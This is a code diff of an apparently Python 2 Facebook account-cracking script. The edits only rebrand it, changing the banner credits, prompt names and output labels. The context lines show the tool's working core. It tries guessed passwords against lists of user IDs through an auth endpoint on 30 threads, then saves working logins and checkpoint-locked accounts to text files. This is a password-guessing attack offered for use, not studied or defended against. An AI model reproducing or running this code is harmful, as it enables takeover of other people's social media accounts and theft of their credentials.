@@ -46,9 +46,9 @@ logo = """
 \033[1;91m  ██║░╚═╝░██║╚██████╔╝██████╔╝██║░╚██╗██║
 \033[1;96m  ╚═╝░░░░░╚═╝░╚═════╝░╚═════╝░╚═╝░░╚═╝╚═
 \033[1;94m===============================================
-\033[1;90m➣ Author : \033[1;97mTFG OWNER
-\033[1;90m➣ Github : \033[1;97mhttps://github.com/pathani404
-\033[1;90m➣ Fb Page: \033[1;97mXTYLISH PATHANI
+\033[1;90m➣ Author : \033[1;97mTFG OWNET
+\033[1;90m➣   FB   : \033[1;97https://www.facebook.com/100057488713509
+\033[1;90m➣ QUEEN  : \033[1;97mXTYLISH PATHANI
 \033[1;94m==============================================="""
 
 
@@ -149,7 +149,7 @@ def log_menu():
 
 
 def log_menu_s():
-    s = raw_input(' \033[1;97m╰─Sani➤ ')
+    s = raw_input(' \033[1;97m╰─muski➤ ')
     if s == '1':
         log_fb()
     elif s == '2':
@@ -304,7 +304,7 @@ def menu():
 
 
 def menu_s():
-    ms = raw_input('\033[1;97m╰─Sani➤ ')
+    ms = raw_input('\033[1;97m╰─muski➤ ')
     if ms == '1':
         auto_crack()
     elif ms == '2':
@@ -372,7 +372,7 @@ def a_s():
     id = []
     cps = []
     oks = []
-    a_s = raw_input(' \033[1;97m╰─Sani➤ ')
+    a_s = raw_input(' \033[1;97m╰─muski➤ ')
     if a_s == '1':
         os.system('clear')
         print logo
@@ -477,13 +477,13 @@ def a_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\033[1;95m[SANI-OK]➤ ' + uid + ' | ' + pass1
+                print '\033[1;95m[MUSKI-OK]➤ ' + uid + ' | ' + pass1
                 ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\033[1;97m[SANI-CP]➤ ' + uid + ' | ' + pass1
+                print '\033[1;97m[MUSKI-CP]➤ ' + uid + ' | ' + pass1
                 cp = open('HOP_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -492,13 +492,13 @@ def a_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\033[1;95m[SANI-OK]➤ ' + uid + ' | ' + pass2
+                    print '\033[1;95m[MUSKI-OK]➤ ' + uid + ' | ' + pass2
                     ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\033[1;97m[SANI-CP]➤ ' + uid + ' | ' + pass2
+                    print '\033[1;97m[MUSKI-CP]➤ ' + uid + ' | ' + pass2
                     cp = open('HOP_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -507,13 +507,13 @@ def a_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\033[1;95m[SANI-OK]➤ ' + uid + ' | ' + pass3
+                        print '\033[1;95m[MUSKI-OK]➤ ' + uid + ' | ' + pass3
                         ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\033[1;97m[SANI-CP]➤ ' + uid + ' | ' + pass3
+                        print '\033[1;97m[MUSKI-CP]➤ ' + uid + ' | ' + pass3
                         cp = open('HOP_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
@@ -522,13 +522,13 @@ def a_s():
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\033[1;95m[SANI-OK]➤ ' + uid + ' | ' + pass4
+                            print '\033[1;95m[MUSKI-OK]➤ ' + uid + ' | ' + pass4
                             ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\033[1;97m[SANI-CP]➤ ' + uid + ' | ' + pass4
+                            print '\033[1;97m[MUSKI-CP]➤ ' + uid + ' | ' + pass4
                             cp = open('HOP_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
@@ -541,7 +541,7 @@ def a_s():
     p = ThreadPool(30)
     p.map(main, id)
     print 47 * '-'
-    print ' \033[1;92mChalo Niklo Ab Nikamo'
+    print ' \033[1;92mChalo KEEP SMILE '
     print ' \033[1;92mTotal \033[1;95mOk\033[1;90m/\033[1;97mCp:' + str(len(oks)) + '/' + str(len(cps))
     print 47 * '-'
     raw_input(' \033[1;90mPress enter to back')
